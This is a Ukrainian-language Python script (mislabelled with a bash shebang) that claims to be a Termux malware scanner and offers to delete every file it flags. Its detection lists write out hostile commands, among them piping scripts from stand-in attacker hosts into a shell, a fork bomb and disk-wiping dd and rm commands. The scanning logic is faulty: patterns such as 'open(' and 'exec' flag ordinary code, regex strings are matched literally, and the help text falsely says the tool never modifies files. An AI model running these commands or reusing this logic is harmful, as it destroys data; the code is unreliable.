#!/data/data/com.termux/files/usr/bin/bash
import os
import sys
import time
import subprocess
import re
from datetime import datetime

# ============================================
#   TBFPUMBA-SckanerOp v6.0 (TBF EDITION)
#   by TBFPUMBA — Technology. Security. Efficiency.
# ============================================

# Кольорові коди
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'

# Розширений список підозрілих паттернів
SUSPICIOUS_PATTERNS = [
    "rm -rf", "format", "delete_all", "malware", "virus",
    "backdoor", "trojan", "rootkit", "keylogger", "ransomware",
    "cryptominer", "exploit", "payload", "shellcode", "reverse shell",
    "nc -e", "bash -i", "python -c", "perl -e", "curl.*|sh",
    "wget.*|bash", "eval", "exec", "system", "popen", "subprocess",
    "os.system", "os.popen", "subprocess.Popen", "subprocess.call",
    "open('", "read('", "write('", "chmod", "chown", "mount", "umount"
]

HIGH_RISK_PATTERNS = [
    "rm -rf --no-preserve-root",
    "dd if=/dev/zero of=/dev/block",
    "mkfs.ext4 /dev/block",
    "chmod 777 /system",
    "mount -o rw,remount /system",
    "curl http://malicious-site.com/install.sh | bash",
    "wget https://evil-domain.com/payload.sh | sh",
    "base64 -d | sh",
    "eval $(cat /dev/urandom | base64)",
    "iptables -F",
    "iptables -X",
    "killall -9",
    "pkill -f",
    ":(){ :|:& };:",
    "sudo rm -rf /",
    "dd if=/dev/zero of=/dev/sda",
    "echo 'nameserver 8.8.8.8' > /etc/resolv.conf"
]

# Підозрілі дозволи для APK
SUSPICIOUS_PERMISSIONS = [
    "android.permission.READ_SMS",
    "android.permission.SEND_SMS",
    "android.permission.RECORD_AUDIO",
    "android.permission.CAMERA",
    "android.permission.READ_CONTACTS",
    "android.permission.WRITE_EXTERNAL_STORAGE",
    "android.permission.READ_PHONE_STATE",
    "android.permission.ACCESS_FINE_LOCATION",
    "android.permission.ACCESS_COARSE_LOCATION",
    "android.permission.INSTALL_PACKAGES",
    "android.permission.INTERNET"
]

# Підозрілі назви файлів (APK, EXE, SH)
SUSPICIOUS_FILENAMES = [
    "hack", "crack", "cheat", "mod", "unlock", "premium", "pro",
    "crypto", "miner", "steal", "fake", "clone", "spy", "track",
    "exploit", "payload", "backdoor", "trojan", "ransomware",
    "keylogger", "rootkit", "virus", "malware"
]

def rainbow_print(text):
    os.system(f'echo "{text}" | lolcat 2>/dev/null || echo "{text}"')

def color_print(text, color=WHITE):
    print(f"{color}{text}{RESET}")

def loading_bar(title, duration=0.01):
    print(f"\n{BLUE}⏳ {title}{RESET}")
    for i in range(101):
        time.sleep(duration)
        bar = "█" * (i // 2) + "░" * (50 - i // 2)
        print(f"\r[{bar}] {i}%", end="")
    print(f"\n{GREEN}✅ Готово!{RESET}\n")

def show_help():
    os.system('clear')
    rainbow_print("📖 TBFPUMBA-SckanerOp v6.0 — Довідка")
    rainbow_print("========================================")
    rainbow_print("🛡️  Про програму:")
    rainbow_print("  Потужний сканер безпеки для виявлення")
    rainbow_print("  та ВИДАЛЕННЯ підозрілих та критичних загроз.")
    rainbow_print("")
    rainbow_print("🚀  Як запустити:")
    rainbow_print("  python tbfpumba_scan.py")
    rainbow_print("")
    rainbow_print("⚙️  Команди:")
    rainbow_print("  help   — показати це керівництво")
    rainbow_print("  y      — запустити сканування")
    rainbow_print("  -TBF   — видалити всі знайдені загрози")
    rainbow_print("  n      — вийти")
    rainbow_print("")
    rainbow_print("📂  Що сканується:")
    rainbow_print("  - .txt, .sh, .py, .js, .c, .cpp, .bash, .zsh, .md")
    rainbow_print("  - .apk файли (аналіз назви, дозволів, розміру)")
    rainbow_print("  - .bin, .exe (за назвою та сигнатурами)")
    rainbow_print("  - Системні папки: /system, /data, /etc")
    rainbow_print("")
    rainbow_print("🔴  Рівні загроз:")
    rainbow_print("  🔴 Критична — може пошкодити систему")
    rainbow_print("  🟡 Підозріла — потребує перевірки")
    rainbow_print("")
    rainbow_print("🔒  Безпека:")
    rainbow_print("  Сканер не змінює файли, тільки аналізує.")
    rainbow_print("========================================")
    input("\nНатисніть Enter, щоб закрити довідку...")

def delete_threats(threats):
    """Видаляє знайдені загрози"""
    if not threats:
        rainbow_print("\n✅ Немає загроз для видалення.")
        return
    
    print(f"\n{RED}⚠️ ВИДАЛЕННЯ ЗАГРОЗ!{RESET}")
    print(f"{RED}Буде видалено {len(threats)} файлів.{RESET}")
    answer = input(f"{RED}Впевнені? (y/n): {RESET}").lower()
    
    if answer in ['y', 'yes']:
        deleted = 0
        for filepath, level, msg in threats:
            try:
                os.remove(filepath)
                print(f"{GREEN}✅ Видалено: {filepath}{RESET}")
                deleted += 1
            except Exception as e:
                print(f"{RED}❌ Не вдалося видалити: {filepath} ({e}){RESET}")
        rainbow_print(f"\n🔒 Видалено {deleted} з {len(threats)} загроз.")
    else:
        rainbow_print("\n❌ Видалення скасовано.")

def check_file_by_name(filepath):
    """Перевіряє назву файлу на підозрілі слова"""
    filename = os.path.basename(filepath).lower()
    for pattern in SUSPICIOUS_FILENAMES:
        if pattern in filename:
            return f"🟡 Підозріла назва: {pattern}"
    return None

def check_apk(filepath):
    """Аналізує APK файл"""
    results = []
    filename = os.path.basename(filepath).lower()
    size = os.path.getsize(filepath) // (1024 * 1024)
    
    for pattern in SUSPICIOUS_FILENAMES:
        if pattern in filename:
            results.append(("🟡", f"Підозріла назва APK: {pattern}"))
            break
    
    if size < 0.5:
        results.append(("🟡", f"APK занадто малий: {size} МБ"))
    elif size > 100:
        results.append(("🟡", f"APK занадто великий: {size} МБ"))
    
    try:
        aapt_check = subprocess.getoutput("which aapt")
        if aapt_check:
            cmd = f"aapt dump permissions {filepath} 2>/dev/null"
            output = subprocess.getoutput(cmd)
            for perm in SUSPICIOUS_PERMISSIONS:
                if perm in output:
                    results.append(("🟡", f"Підозрілий дозвіл: {perm}"))
    except:
        pass
    
    return results

def scan_file_content(filepath):
    """Перевіряє вміст файлу на підозрілі патерни"""
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            for pattern in HIGH_RISK_PATTERNS:
                if pattern in content:
                    return "🔴", pattern
            for pattern in SUSPICIOUS_PATTERNS:
                if pattern in content:
                    return "🟡", pattern
    except Exception:
        pass
    return None, None

def scan_file(filepath):
    """Повна перевірка файлу: назва + вміст"""
    results = []
    name_check = check_file_by_name(filepath)
    if name_check:
        results.append(("🟡", name_check))
    level, pattern = scan_file_content(filepath)
    if level:
        results.append((level, pattern))
    return results

def scan_folder(path):
    suspicious_files = []
    total_files = 0
    scanned_files = 0
    
    for root, dirs, files in os.walk(path):
        total_files += len(files)
    
    loading_bar(f"Сканування папки: {path}", 0.005)
    
    for root, dirs, files in os.walk(path):
        for file in files:
            scanned_files += 1
            filepath = os.path.join(root, file)
            
            if filepath == os.path.realpath(__file__):
                continue
            
            if file.endswith('.apk'):
                print(f"{CYAN}📦 APK файл: {filepath}{RESET}")
                apk_results = check_apk(filepath)
                for level, msg in apk_results:
                    suspicious_files.append((filepath, level, msg))
                    if level == "🔴":
                        color_print(f"🔴 КРИТИЧНО: {filepath} -> {msg}", RED)
                    else:
                        color_print(f"🟡 ПОПЕРЕДЖЕННЯ: {filepath} -> {msg}", YELLOW)
                continue
            
            if os.access(filepath, os.X_OK) and not file.endswith(('.txt', '.sh', '.py', '.js', '.md')):
                name_check = check_file_by_name(filepath)
                if name_check:
                    suspicious_files.append((filepath, "🟡", name_check))
                    color_print(f"🟡 ВИКОНУВАНИЙ ФАЙЛ: {filepath} -> {name_check}", YELLOW)
                continue
            
            if file.endswith(('.txt', '.sh', '.py', '.js', '.c', '.cpp', '.bash', '.zsh', '.md', '.conf', '.cfg')):
                results = scan_file(filepath)
                for level, msg in results:
                    suspicious_files.append((filepath, level, msg))
                    if level == "🔴":
                        color_print(f"🔴 КРИТИЧНА ЗАГРОЗА: {filepath} -> {msg}", RED)
                    else:
                        color_print(f"🟡 ПІДОЗРІЛИЙ ФАЙЛ: {filepath} -> {msg}", YELLOW)
            
            if scanned_files % 50 == 0:
                print(f"{BLUE}📊 Прогрес: {scanned_files}/{total_files}{RESET}")
    
    return suspicious_files

if __name__ == "__main__":
    os.system('clear')
    rainbow_print("🔥 TBFPUMBA-SckanerOp v6.0 (TBF EDITION) 🔥")
    rainbow_print("⚡ by TBFPUMBA — Technology. Security. Efficiency. ⚡")
    rainbow_print("========================================")
    
    loading_bar("Ініціалізація сканера", 0.02)
    
    threats = []
    while True:
        answer = input("⚠️ Запустити сканування? (y/n/help/-TBF): ").lower()
        if answer in ['y', 'yes']:
            break
        elif answer in ['n', 'no']:
            rainbow_print("❌ Сканування скасовано.")
            sys.exit()
        elif answer == 'help':
            show_help()
            continue
        elif answer == '-tbf':
            delete_threats(threats)
            sys.exit()
        else:
            print("❗ Введіть 'y', 'n', 'help' або '-TBF'.")
    
    start_time = datetime.now()
    target_path = os.path.expanduser("~")
    results = scan_folder(target_path)
    end_time = datetime.now()
    duration = (end_time - start_time).total_seconds()
    
    if results:
        critical = [r for r in results if r[1] == "🔴"]
        suspicious = [r for r in results if r[1] == "🟡"]
        threats = results
        
        print("\n" + "="*50)
        rainbow_print("🔍 РЕЗУЛЬТАТИ СКАНУВАННЯ")
        print("="*50)
        
        if critical:
            color_print("\n🔴🔴🔴 КРИТИЧНІ ЗАГРОЗИ:", RED)
            for file, level, msg in critical:
                color_print(f"  🔴 {file} -> {msg}", RED)
        
        if suspicious:
            color_print("\n🟡 ПІДОЗРІЛІ ФАЙЛИ:", YELLOW)
            for file, level, msg in suspicious:
                color_print(f"  🟡 {file} -> {msg}", YELLOW)
        
        color_print(f"\n🔒 Знайдено: {len(results)} підозрілих файлів.", BLUE)
        color_print(f"💡 Для видалення всіх загроз введіть: -TBF", CYAN)
        threats = results
    else:
        rainbow_print("\n✅ Підозрілих файлів не знайдено.")
        threats = []
    
    print(f"\n⏱️ Час сканування: {duration:.2f} секунд")
    
    while True:
        cmd = input("\n💡 Введіть команду (-TBF для видалення, Enter для виходу): ").strip()
        if cmd == '-TBF':
            delete_threats(threats)
            sys.exit()
        elif cmd == '':
            rainbow_print("👋 Дякуємо, що використовуєте TBFPUMBA-SckanerOp!")
            sys.exit()
        else:
            print("❌ Невідома команда. Введіть -TBF або натисніть Enter.")
